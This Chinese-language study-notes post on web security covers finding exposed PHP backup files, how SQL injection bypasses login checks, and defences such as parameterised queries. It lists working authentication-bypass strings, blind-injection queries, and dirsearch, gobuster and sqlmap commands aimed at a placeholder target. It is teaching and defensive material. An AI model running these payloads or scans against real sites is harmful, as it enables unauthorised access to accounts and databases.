---
title: Web安全学习笔记 - SQL注入与万能密码
tags: [Web安全, SQL注入, 渗透测试, 网络安全, 学习笔记]
date: 2024-03-03
---

# Web安全学习笔记 - SQL注入与万能密码

本文整理了Web安全学习中的重要知识点，包括PHP备份文件发现、SQL注入攻击原理、万能密码构造等内容，适合网络安全初学者学习参考。

<!-- more -->

## PHP备份文件后缀名发现

在Web渗透测试中，发现备份文件是一个重要的信息收集手段。

### 常见备份文件后缀

```
.git .swn .swp .~ .bak .bash_history .bkf
```

### 使用方法

**直接访问法**：在浏览器的URL中输入上述后缀名即可

**路径扫描法**：
- 在Kali Linux中，使用dirsearch工具
- 输入指令：`dirsearch -u [网址]`
- 可以扫描所有的页面和目录

### 实战技巧

1. **常见备份文件名模式**：
   - `index.php.bak`
   - `config.php~`
   - `database.php.swp`
   - `.git/config`

2. **自动化扫描**：
   ```bash
   # 使用dirsearch
   dirsearch -u http://target.com -e php,bak,swp,~
   
   # 使用gobuster
   gobuster dir -u http://target.com -w wordlist.txt -x php,bak,swp
   ```

## SQL注入攻击原理

### 基本概念

SQL注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，来操纵后端数据库。

### 攻击原理示例

**正常登录流程**：
```sql
select * from user where username='user' and password='pass'
```

**注入攻击流程**：
- 用户名输入：`admin'#`
- 密码输入：`123456`（任意密码）
- 后台SQL语句变成：
```sql
select * from user where username='admin'#' and password='123456'
```

由于`#`在SQL中是注释符，注释符后面的内容不起作用，所以实际执行的SQL是：
```sql
select * from user where username='admin'
```

这样就绕过了密码验证，只要用户名正确就可以登录成功。

## 万能密码详解

### 什么是万能密码

万能密码并不是一个真正意义上的密码，而是一种拥有不同变体的格式，利用SQL注释特性来绕过身份验证。

### 万能密码的形式

根据参数的包裹方式，万能密码可以有多种形式：

#### 使用 `#` 注释符

1. **数值型**：`admin #`
2. **单引号字符串型**：`admin'#`
3. **双引号字符串型**：`admin"#`

#### 使用 `--` 注释符

1. **数值型**：`admin-- a`
2. **单引号字符串型**：`admin'-- a`
3. **双引号字符串型**：`admin"-- a`

**注意**：`--` 后面需要跟一个空格才能生效。

### 万能密码的工作原理

#### 原始查询语句
```sql
SELECT * FROM users WHERE username='[用户输入]' AND password='[密码输入]'
```

#### 注入后的语句
当输入`admin'#`作为用户名时：
```sql
SELECT * FROM users WHERE username='admin'#' AND password='任意密码'
```

#### 实际执行的语句
```sql
SELECT * FROM users WHERE username='admin'
```

### 防护措施

#### 1. 参数化查询（推荐）

**PHP PDO示例**：
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**PHP MySQLi示例**：
```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

#### 2. 输入验证和过滤

```php
// 过滤特殊字符
$username = mysqli_real_escape_string($connection, $username);
$password = mysqli_real_escape_string($connection, $password);

// 使用白名单验证
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username format");
}
```

#### 3. 最小权限原则

- 数据库用户只授予必要的权限
- 不使用root或管理员账户连接数据库
- 限制数据库用户的操作范围

#### 4. 错误信息处理

```php
// 不要显示详细的数据库错误信息
try {
    // 数据库操作
} catch (Exception $e) {
    // 记录详细错误到日志
    error_log($e->getMessage());
    // 只向用户显示通用错误信息
    echo "登录失败，请检查用户名和密码";
}
```

## 实战检测方法

### 1. 手工检测

**基本测试payload**：
```
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
') OR (1=1)--
```

### 2. 自动化工具

**SQLMap使用**：
```bash
# 基本扫描
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --dbs

# 指定参数扫描
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" -p username

# 获取数据库信息
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --current-db
```

### 3. 布尔盲注检测

```sql
-- 判断数据库类型
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

-- 判断数据库名长度
' AND (SELECT LENGTH(database()))=8--

-- 逐字符猜解数据库名
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))=116--
```

## 安全开发建议

### 1. 代码层面

- **永远不要信任用户输入**
- **使用参数化查询或存储过程**
- **实施严格的输入验证**
- **使用白名单而不是黑名单**

### 2. 架构层面

- **实施深度防御策略**
- **使用Web应用防火墙（WAF）**
- **定期进行安全测试**
- **建立安全监控机制**

### 3. 运维层面

- **定期更新系统和软件**
- **配置安全的服务器环境**
- **实施访问控制和权限管理**
- **建立安全事件响应流程**

## 总结

SQL注入攻击是Web应用中最常见和危险的安全漏洞之一。理解其攻击原理和防护方法对于Web开发者和安全从业者都至关重要。

**关键要点**：
1. **了解攻击原理**：理解SQL注入的工作机制
2. **掌握检测方法**：能够识别和发现SQL注入漏洞
3. **实施有效防护**：使用参数化查询等安全编程实践
4. **持续学习**：跟上最新的攻击技术和防护方法

通过系统学习这些知识，可以帮助开发者构建更安全的Web应用，同时也为安全测试人员提供了实用的技术参考。

**安全提醒**：本文内容仅供学习和防护参考，请勿用于非法攻击活动。